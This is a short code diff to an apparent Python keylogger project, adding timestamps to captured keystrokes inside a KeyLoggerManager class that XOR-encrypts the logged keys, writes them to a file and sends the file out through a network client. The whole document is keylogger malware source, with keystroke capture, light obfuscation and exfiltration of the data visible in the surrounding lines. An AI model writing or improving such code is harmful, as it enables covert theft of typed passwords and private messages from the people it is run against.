@@ -4,6 +4,7 @@ from KeyLoggerService import KeyLoggerService
 import Writer
 import Encryptor
 import Network
+import datetime
 
 
 class KeyLoggerManager:
@@ -20,7 +21,7 @@ class KeyLoggerManager:
             data = ''.join(self.keylogger.get_logged_keys())
             # print(data + ' from 19')
             if data != '':
-                encrypted_data = self.encryptor.xor_encrypt(data)
+                encrypted_data = self.encryptor.xor_encrypt(self.addTimeLine(data))
                 # print(data + ' from 22')
                 # print(encrypted_data)
                 self.writer.write_to_file(encrypted_data)
@@ -41,6 +42,11 @@ class KeyLoggerManager:
             self.client.send_data(file_name)
         except ConnectionError as e:
             print(f"Connection Error: {e}")
+
+
+    def addTimeLine(self, data):
+        timestamp = (datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
+        return f"{timestamp}: {data}\n"
 
 
 
